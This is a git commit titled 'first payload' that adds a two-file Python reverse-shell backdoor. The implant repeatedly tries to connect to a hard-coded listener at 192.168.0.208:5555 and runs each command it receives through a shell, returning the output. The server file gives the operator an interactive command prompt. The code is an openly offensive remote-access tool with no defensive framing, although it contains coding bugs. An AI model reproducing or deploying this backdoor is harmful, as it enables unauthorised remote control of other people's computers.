6abd80983226d93fdd600cb6be4814fecc770e41
Mike Duran <mike.duran@hotmail.de>
2020-12-28 18:42:14 +0100

    first payload

---
+++ backdoor/backdoor.py
@@ -0,0 +1,53 @@
+import socket
+import time 
+import json
+import subprocess # execute every command that server sends
+
+
+#takes data we are going to send
+def reliable_send(data):
+    jsondata=json.dumps(data) #store actual command
+    s.send(jsondata.encode()) #send encoded data to target.
+    pass
+
+
+def reliable_recv():
+    data= ''
+    while True:
+        try:
+            #get 1024 bites from serrver
+            data = data + s.recv(1024).decode().rstrip() #decode data
+            return json.load(data)
+        except ValueError:
+            continue 
+pass
+
+
+#try to connect to kali linux machine
+def connection():
+    while True: 
+        time.sleep(20)
+        try:
+            s.connect(("192.168.0.208",5555))
+            shell()
+            s.close
+            break
+        except:
+            connection()
+
+
+#work on received commands from server
+def shell():
+    while True:
+        command = reliable_recv()
+        if command== 'quit':
+            break
+        else:
+            execute= subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read() #gives output of cmd
+            result= result.decode
+            reliable_send(result)
+
+#first establish a connection between Payload and Server.
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connection()
---
+++ backdoor/server.py
@@ -0,0 +1,45 @@
+import socket
+import json
+
+#takes data we are going to send
+def reliable_send(data):
+    jsondata=json.dumps(data) #store actual command
+    target.send(jsondata.encode()) #send encoded data to target.
+
+
+def reliable_recv():
+    data= ''
+    while True:
+        try:
+            #get 1024 bites from  and add it to the previous received data
+            data = data + target.recv(1024).decode().rstrip() #decode data and restrip it from additional chars
+            return json.load(data)
+        except ValueError:
+            continue 
+
+
+def target_communication():
+    while True:
+        command = input('* Shell~%s: ' % str(ip))
+        reliable_send(command)
+        if command=='quit':
+            break
+        else:
+            result = reliable_recv()
+            print(result)
+        pass
+    pass
+
+#first establish a connection between Payload and Server.
+sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+sock.bind(("192.168.0.208",5555)) # Kali linux IP adress
+
+print("[+] Listening for Connection")
+
+sock.listen(5)# we listen to up to 5 different connections
+
+target, ip = sock.accept()
+
+print("[+] Target Connected from: ",str(ip))
+
+target_communication()
